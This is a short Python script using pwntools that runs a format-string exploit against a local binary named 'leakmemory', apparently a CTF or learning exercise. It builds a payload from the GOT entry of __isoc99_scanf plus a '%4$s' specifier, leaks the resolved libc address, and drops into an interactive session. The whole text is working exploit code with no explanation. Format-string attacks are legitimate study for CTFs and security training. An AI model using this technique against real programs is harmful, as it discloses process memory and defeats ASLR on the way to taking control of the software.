from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print('__isoc99_scanf got addr:',hex(__isoc99_scanf_got))
payload = p32(__isoc99_scanf_got) + b'%4$s'
print('payload:',payload)
#gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print('__isoc99_scanf libc addr:',hex(u32(sh.recv()[4:8])))# remove the first bytes of __isoc99_scanf@got
sh.interactive()